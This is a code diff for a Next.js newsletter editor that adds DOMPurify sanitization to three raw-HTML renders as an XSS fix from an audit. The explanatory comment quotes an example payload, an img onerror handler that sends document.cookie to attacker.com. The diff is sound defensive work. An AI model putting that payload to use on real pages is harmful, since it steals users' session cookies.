@@ -1,6 +1,7 @@
 "use client";
 
 import { useState, useCallback } from "react";
+import DOMPurify from "isomorphic-dompurify";
 import { useParams, useRouter } from "next/navigation";
 import { useQuery, useQueryClient } from "@tanstack/react-query";
 import { toast } from "sonner";
@@ -48,6 +49,49 @@ const SKILL_LABELS: Record<string, string> = {
 };
 
 interface StreamProgress { step: number; tools: string[]; label: string }
+
+/**
+ * XSS hardening (audit critical #2). Strategist content originates
+ * from:
+ *  - The AI writer (trusted-ish; output schema constrains tags but
+ *    the LLM could theoretically emit `<script>` inside one of the
+ *    allowed elements).
+ *  - User edits in our textarea (untrusted — anything goes).
+ *  - Beehiiv API responses pulled via webhook (untrusted — Beehiiv
+ *    could be compromised, or the publication could have malicious
+ *    third-party embeds).
+ *
+ * The Versions tab + WriteTab preview render this content via
+ * `dangerouslySetInnerHTML`. Without sanitization, a malicious
+ * `<img src=x onerror=fetch('https://attacker.com?c='+document.cookie)>`
+ * inside any of those sources executes as soon as the user opens
+ * the panel. Wrap every untrusted-HTML render through
+ * `sanitizeContentHtml` which drops script tags, event handlers,
+ * and javascript: URLs while preserving the semantic markup the
+ * writers actually emit.
+ *
+ * Allow-list intentionally tight: same tags + attrs the
+ * write-newsletter prompt promises to produce + standard inline
+ * formatting + safe links/images. Anything else gets stripped.
+ */
+function sanitizeContentHtml(html: string): string {
+  return DOMPurify.sanitize(html, {
+    ALLOWED_TAGS: [
+      "h1", "h2", "h3", "h4", "h5", "h6",
+      "p", "br", "hr",
+      "ul", "ol", "li",
+      "blockquote", "pre", "code",
+      "strong", "em", "b", "i", "u", "s", "small", "sub", "sup",
+      "a", "img", "figure", "figcaption",
+      "table", "thead", "tbody", "tr", "th", "td",
+      "div", "span",
+    ],
+    ALLOWED_ATTR: ["href", "src", "alt", "title", "target", "rel", "class", "data-quote", "data-attributed-to", "data-placeholder", "data-pending", "data-index", "data-disclosure"],
+    // Force-strip javascript: URLs and event handlers — the default
+    // DOMPurify policy already does this but be explicit.
+    ALLOWED_URI_REGEXP: /^(?:https?:|data:image\/|mailto:|tel:|#|\/)/i,
+  });
+}
 
 async function consumeSSE(
   res: Response,
@@ -971,7 +1015,7 @@ function WriteTab({ idea, ideaId, onRefresh }: { idea: IdeaDetail; ideaId: strin
           {preview ? (
             <div
               className="w-full min-h-[30rem] rounded-md border bg-background p-6 prose prose-sm dark:prose-invert max-w-none overflow-auto"
-              dangerouslySetInnerHTML={{ __html: html }}
+              dangerouslySetInnerHTML={{ __html: sanitizeContentHtml(html) }}
             />
           ) : (
             <textarea value={html} onChange={(e) => setHtml(e.target.value)} rows={20} className="w-full rounded-md border bg-background p-4 font-mono text-sm outline-none focus:ring-1 focus:ring-ring" placeholder="Newsletter content (HTML)..." />
@@ -1036,7 +1080,7 @@ function ReviewTab({ idea, loading, onSubmitReview, onApprove, onReject }: { ide
             <CardContent>
               <div
                 className="prose prose-sm dark:prose-invert max-w-none max-h-96 overflow-auto"
-                dangerouslySetInnerHTML={{ __html: idea.content.html }}
+                dangerouslySetInnerHTML={{ __html: sanitizeContentHtml(idea.content.html) }}
               />
             </CardContent>
           </Card>
@@ -1385,7 +1429,7 @@ function VersionColumn({
       </CardHeader>
       <CardContent className="max-h-[36rem] overflow-y-auto p-4">
         {html
-          ? <div className="prose prose-sm dark:prose-invert max-w-none" dangerouslySetInnerHTML={{ __html: html }} />
+          ? <div className="prose prose-sm dark:prose-invert max-w-none" dangerouslySetInnerHTML={{ __html: sanitizeContentHtml(html) }} />
           : <p className="text-xs text-muted-foreground italic">Not available.</p>}
       </CardContent>
     </Card>
